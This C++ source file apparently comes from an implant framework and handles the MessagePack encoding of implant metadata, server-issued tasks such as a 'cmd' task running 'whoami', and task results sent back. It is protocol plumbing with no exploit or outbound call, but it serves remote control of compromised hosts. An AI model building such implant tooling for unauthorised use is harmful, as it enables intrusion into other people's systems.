#include <iostream>
#include <vector>
#include <map>
#include <string>
#include "../../protocols/json/json.h"

using json = nlohmann::json;

/*
Metadata structure

{"implant_uuid":"1234"} //and any other fields in the future. 
*/

/** * @brief Creates a msgpack metadata object.
* @param metadata: A map of <std::string, std::string>.
* @param response_buffer: A vector to append the response bytes to.
* @return 0 success, 1 fail
*/
int create_metadata(const std::map<std::string, std::string>& metadata, std::vector<unsigned char>& response_buffer) {
    // Check if map is empty
    if (metadata.empty()) {
        return 1;
    }

    try {
        // 1. Convert Map -> JSON
        json j = metadata;

        // 2. Serialize JSON -> MsgPack Bytes
        std::vector<uint8_t> packed_bytes = json::to_msgpack(j);

        // 3. Append to the response buffer
        response_buffer.insert(response_buffer.end(), packed_bytes.begin(), packed_bytes.end());

        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Packing failed: " << e.what() << std::endl;
        return 1;
    }
}

/*
Task structure:

{task_uuid: 1234, implant_uuid: 9999, "task":{"taskname":"cmd" "args":{"cli":"whoami"}}}

*/

/** * @brief [msgpack -> json] Takes task msgpack bytes and turns them into a dynamic json object
* @param task_as_msgpack_bytes: The data to turn into a json object
* @return The json object (acts like a map/dict)
*/
nlohmann::json decode_msgpack_task(const std::string& task_as_msgpack_bytes) {
    // Decode MsgPack -> JSON Object
    // handles the nested maps automatically.
    // If input is invalid, this throws json::parse_error

    json task_data = json::from_msgpack(task_as_msgpack_bytes);

    // items() gives key/value iterator for the JSON object
    for (auto& [key, value] : task_data.items()) {
        // If the value is complex (like the nested "task" map), this prints it cleanly as a string representation
        std::cout << key << ": " << value.dump() << '\n';
    }

    return task_data;
}

/*
Task response structure

{"task_uuid":"1234", "implant_uuid": 9999, "result":{"data_type":"text", "data":"somedomain\bob"}}

*/
// JSON/MAP -> msgpack
//helper to pack it all together, and reduce code dup. Can introduce more overloads easier this way too.
int pack_final_response(const std::string& implant_uuid, const std::string& task_uuid, const json& result_object, std::vector<uint8_t>& response_buffer) {
    try {
        json root;
        root["task_uuid"] = task_uuid;
        root["implant_uuid"] = implant_uuid;
        root["result"] = result_object;

        response_buffer = json::to_msgpack(root);
        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Packing error: " << e.what() << "\n";
        return 1;
    }
}

// 

/**
 * @brief [ -> MSGPACK] Create a msgpack encoded task response - overload for when the data type is text. 
 * @param implant_uuid: uuid of current implant
 * @param task_uuid: uuid of task that this corresponds to
 * @param text_data: the text based data that will go back to the server as a response for this task
 * @param [OUT] response_buffer: A buffer where the msgpack data will be stored. 
 * @return 0 on success, 1 on fail
 */
int create_task_response(const std::string& implant_uuid,const std::string& task_uuid,const nlohmann::json& result_json, std::vector<uint8_t>& response_buffer) {

    //json result;
    //result["data_type"] = "text";
    //result["data"] = text_data; // Simple string assignment

    //result["response"] = result_json;

    //probably can rename pack_final_response -> create_task_response. This is no longer needed wiht named args

    return pack_final_response(implant_uuid, task_uuid, result_json, response_buffer);
}

/**
 * @brief [ -> MSGPACK] Create a msgpack encoded task response - overload for when the data type is binary.
 * @param implant_uuid: uuid of current implant
 * @param task_uuid: uuid of task that this corresponds to
 * @param binary_data: the binary based data that will go back to the server as a response for this task
 * @param [OUT] response_buffer: A buffer where the msgpack data will be stored.
 * @return 0 on success, 1 on fail
 */
//int create_task_response(const std::string& implant_uuid, const std::string& task_uuid, const std::vector<uint8_t>& binary_data, std::vector<uint8_t>& response_buffer) {
//
//    json result;
//    result["data_type"] = "bytes";
//    // json::bin so it actually uses binary
//    result["data"] = json::binary(binary_data);
//
//    return pack_final_response(implant_uuid, task_uuid, result, response_buffer);
//}


//helpers: Add a text result to a json object
void add_text_result(nlohmann::json& result,
    const std::string& key,
    const std::string& value)
{
    result[key] = {
        {"type", "text"},
        {"value", value}
    };
}
